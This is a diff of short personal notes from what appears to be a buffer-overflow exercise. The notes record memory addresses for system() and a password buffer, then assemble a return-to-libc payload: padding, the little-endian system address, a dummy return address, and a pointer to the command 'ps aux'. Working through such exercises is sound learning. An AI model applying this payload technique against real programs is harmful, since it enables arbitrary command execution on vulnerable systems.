@@ -39,19 +39,15 @@ using the original shell code, it looks like some of the groups affect ebp and e
 the 6th group of bytes changes ebp
 the 7th group of bytes changes eip
 
+&system       = 0xf7e3a940
 &Password     = 0xffffd094
-&Password[20] = 0xffffd0a8
-&Password[24] = 0xffffd0ac
-&Password[28] = 0xffffd0b0
+&Password[28] = 0xffffd0b0 "system"
+&Password[40] = 0xffffd09c "ps aux"
 
-???
+address of system goes at position 7 in the shell code
 
-&system  = 0xf7e3a940
-&environ = 0xf7fb1dbc
+structure of shell code: offset + &system + dummy return address + &command
 
-address of system probably goes at position 7 in the shell code
+aaaaaaaaaaaaaaaaaaaaaaaa + 40 a9 e3 f7 + aaaa +  9c d0 ff ff + aaaa + ps aux
 
-structure of shell code: offset + &system + dummy address + command
-
-aaaaaaaaaaaaaaaaaaaaaaaa + 40 a9 e3 f7 + aaaa + ??
 
